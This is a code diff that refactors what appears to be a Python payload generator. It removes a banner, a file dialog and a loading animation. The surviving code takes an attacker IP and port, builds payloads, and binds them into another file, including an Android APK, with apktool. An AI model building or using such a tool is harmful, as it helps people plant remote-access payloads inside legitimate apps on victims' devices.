@@ -3,31 +3,12 @@ import platform
 import logging
 import subprocess
 import threading
-from tkinter import Tk, filedialog
-from pyfiglet import Figlet
 import sys
 import time
-
-# Create a custom Figlet font
-custom_figlet = Figlet(font="slant")
-
-# Display 'Pranshu' using the custom font
-print(custom_figlet.renderText("Pranshu"))
 
 # Set up the logging system
 logging.basicConfig(filename="payload_generator.log", level=logging.INFO, format="%(asctime)s - %(levelname)s: %(message)s")
 log = logging.getLogger("payload_generator")
-
-# Function to get the path to the file you want to bind
-def get_bind_file_path():
-    if platform.system() == "Windows":
-        root = Tk()
-        root.withdraw()
-        file_path = filedialog.askopenfilename()
-        root.destroy()
-    else:
-        file_path = input("Enter the path to the file you want to bind: ")
-    return file_path
 
 # Function to create the "Payloads" folder if it doesn't exist
 def create_payloads_folder():
@@ -46,28 +27,9 @@ def execute_command(command, verbose=False):
         log.error(error_message)
         return error_message
 
-# Function to generate payloads with "Please Wait" animation
-def generate_payload_with_animation(ip, port, payload_type, android_api_level=None, bind=False, bind_file=None, verbose=False):
-    animation_thread = None
-
-    # Define the animation characters
-    animation_chars = "|/-\\"
-
-    # Function to display animation
-    def display_animation():
-        i = 0
-        while not done:
-            sys.stdout.write("\rPlease Wait... " + animation_chars[i])
-            sys.stdout.flush()
-            time.sleep(0.1)
-            i = (i + 1) % 4
-
+# Function to generate payloads
+def generate_payload(ip, port, payload_type, android_api_level=None, bind=False, bind_file=None, verbose=False):
     try:
-        done = False
-        if verbose:
-            animation_thread = threading.Thread(target=display_animation)
-            animation_thread.start()
-
         if not ip or not port:
             raise ValueError("IP address and port are required.")
 
@@ -93,8 +55,8 @@ def generate_payload_with_animation(ip, port, payload_type, android_api_level=No
 
         if bind:
             if not bind_file:
-                bind_file = get_bind_file_path()
-
+                raise ValueError("Binding file path is required.")
+            
             if payload_type == "android":
                 output_file = f"Payloads/bind_payload.apk"
                 binding_command = f"apktool b {output_file} -o {output_file} -f {bind_file}"
@@ -108,16 +70,10 @@ def generate_payload_with_animation(ip, port, payload_type, android_api_level=No
         if "Exception" in payload_output:
             raise Exception(f"Payload generation failed: {payload_output}")
 
-        done = True
-        if verbose:
-            print("\n")
         success_message = f"{payload_type.capitalize()} payload generated successfully as '{output_file}'{' (and bound)' if bind else ''}"
         log.info(success_message)
         return success_message
     except Exception as e:
-        done = True
-        if verbose:
-            print("\n")
         log.error(str(e))
         return str(e)
 
@@ -148,5 +104,5 @@ if __name__ == "__main__":
     bind = input("Do you want to bind payloads? (yes or no): ").strip().lower() == "yes"
     bind_file = input("Enter the path to the file you want to bind (leave empty if not binding): ").strip()
 
-    result = generate_payload_with_animation(ip, port, payload_type, android_api_level, bind, bind_file, verbose=verbose)
+    result = generate_payload(ip, port, payload_type, android_api_level, bind, bind_file, verbose=verbose)
     print(result)
